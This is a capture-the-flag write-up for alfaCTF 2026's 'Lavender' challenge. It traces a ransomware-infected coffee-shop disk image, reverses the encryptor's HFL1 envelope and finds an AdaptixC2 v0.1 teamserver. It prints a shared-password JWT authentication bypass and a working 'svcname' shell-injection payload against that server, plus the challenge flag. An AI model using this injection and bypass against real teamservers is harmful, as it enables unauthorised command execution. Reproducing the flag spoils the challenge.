# Lavender — alfaCTF 2026

**Category:** Forensics / OSINT / Web  
**Difficulty:** Medium  
**Tags:** forensics, linux, ext4, encase, osint, c2, adaptixc2, rce, ransomware  
**Flag:** `alfa{YoU_jusT_SAved_A_c0fFeE_sHOp}`

## Overview

A small chain of coffee shops (Northwind Coffee Roasters) was hit by ransomware. We're given an EnCase forensic image (`CAFE.E01/E02`) of the infected box and need to recover `/home/user/Documents/NorthwindCoffee/accounting/flag.txt.GSenc`.

The chain: pull artifacts off the E01 → reverse the encryptor's envelope format → OSINT identifies the C2 stack as AdaptixC2 v0.1 → auth-and-RCE the operator's teamserver → exfil the matching RSA private key → decrypt the flag.

## Stage 1 — Forensics

The image holds an ext4 partition at offset 2048 inside `CAFE.E01`. We read it directly with sleuthkit, no mounting needed:

```
fls -o 2048 -r CAFE.E01
icat -o 2048 CAFE.E01 <inode>   # for each artifact
```

Extracted:

- `flag.txt.GSenc` — 334 B, encrypted flag
- `GS-encrypt` — Go ELF, the ransomware
- `agent.bin` — Linux binary, AdaptixC2 gopher post-ex agent
- `system.journal`, `user-1000.journal` — show `python3 /tmp/northwind_setup.py` and `/tmp/place_flag.sh` running as part of the CTF setup

## Stage 2 — Reverse the encryptor

`GS-encrypt` is Go (vcs.revision pinned), source paths point to `linux_dump/cmd/hybrid-encrypt/main.go` and `linux_dump/internal/hybrid/hybrid.go`.

```
go tool nm GS-encrypt | grep embeddedPublicKeyPEM
go tool objdump -s "linux_dump/internal/hybrid.MarshalEnvelope" GS-encrypt
```

The embedded RSA-2048 public key sits at file offset `0x2a9580` (length 451). `MarshalEnvelope` reveals the on-disk format `HFL1`:

```
magic[4]      = "HFL1"
version       u8
keyAlgo       u8   (1 = RSA-OAEP-SHA256)
dataAlgo      u8   (1 = AES-256-GCM)
wrappedKeyLen u16  BE
nonceLen      u16  BE
ciphertextLen u32  BE
wrappedKey[wrappedKeyLen]
nonce[nonceLen]
ciphertext+tag[ciphertextLen]
```

For our file: `version=1, wrapped=256, nonce=12, ct=51`.

## Stage 3 — OSINT → C2

The CTF Telegram channel hint pointed to `gigashad.xyz` and a video of the attacker's setup. The video shows them connecting to `lab.gigashad.xyz:4321` with **AdaptixC2**, and the connect-dialog UI matches the **v0.1** tag (commit `18db12a`, 2025-01-26) — pre-OTP era, four-field connect dialog.

A subtitle in the video is the actual hint:

> Всё готово, можно создать Listener и Агента и закинуть к жертве

i.e. "everything is ready: create a Listener, generate an Agent, push it onto the victim." The "victim" in this puzzle is the operator's own server — the box that holds the GS-encrypt private key.

## Stage 4 — Authenticate

`profile.json` in v0.1 uses a single shared password. `tcLogin` only checks `SHA256(password) == ts.Hash` and signs a JWT with whatever `username` the client sent — there's no per-user table and no role check. With password `pass` we can claim any username, including `gigashad`.

`tcConnect` upgrades the WebSocket unconditionally and reads the first frame as `{"access_token":"<jwt>"}`. (Pre-OTP, no `?otp=` query param.)

## Stage 5 — RCE — `/agent/generate` `svcname` injection

In `Extenders/agent_beacon/pl_agent.go:185`:

```go
cmdConfig = fmt.Sprintf(
    "%s %s %s/config.cpp -DSERVICE_NAME='\"%s\"' -DPROFILE='\"%s\"' -DPROFILE_SIZE=%d -o %s/config.o",
    Compiler, CFlag, ObjectDir,
    generateConfig.SvcName, string(agentProfile), agentProfileSize, tempDir,
)
runnerCmdConfig := exec.Command("sh", "-c", cmdConfig)
```

`SvcName` (the `svcname` field in the agent-generate config) is interpolated straight into a `sh -c` argument with only `'"..."'` wrapping. Closing the single quote escapes the wrapper.

The connector's failure path returns stderr to the client:

```go
if err != nil { return nil, "", errors.New(string(stderr.Bytes())) }
```

So we redirect command output to stderr and force `false` to get our output back in the JSON `message`.

Payload:

```
svcname = "'; (CMD) 1>&2; false; #"
```

Resulting `sh -c` command line:

```
... -DSERVICE_NAME='"'; (CMD) 1>&2; false; #"' -DPROFILE='"..."' ...
```

A working listener of type `external/http/BeaconHTTP` must exist for `TsListenerGetProfile` to succeed before `agent/generate` reaches the build step — the exploit creates one bound to 127.0.0.1 on a random port and stops it afterwards.

## Stage 6 — Loot the key

Recon from inside the teamserver container:

```
uid=10001(adaptix) ... in /root/AdaptixC2/extenders/agent_beacon (cwd inherited)
$ find / -name "priv*.pem"
/DECRYPTION_KEYS/Stonegate_Partners_Labs/private.pem
/DECRYPTION_KEYS/Redwood_Works_Operations/private.pem
/DECRYPTION_KEYS/Northwind_Coffee_Roasters/private.pem
```

`cat` the Northwind one — its modulus matches the public key embedded in `GS-encrypt`. It's the right key.

## Stage 7 — Decrypt

Parse the HFL1 envelope, RSA-OAEP-SHA256-unwrap the AES-256 key, AES-GCM-decrypt the body:

```
$ python3 decrypt.py flag.txt.GSenc priv.pem
alfa{YoU_jusT_SAved_A_c0fFeE_sHOp}
```

## Flag

`alfa{YoU_jusT_SAved_A_c0fFeE_sHOp}`

## Files

Solver scripts: [`artifacts/`](artifacts/)

| File | Role |
|------|------|
| `exploit.py` | AdaptixC2 v0.1 RCE driver — login as `gigashad`, create a `BeaconHTTP` listener, fire the `svcname` injection, stop the listener |
| `decrypt.py` | HFL1 envelope decryptor — RSA-OAEP-SHA256 unwraps the AES key, AES-GCM decrypts the body |
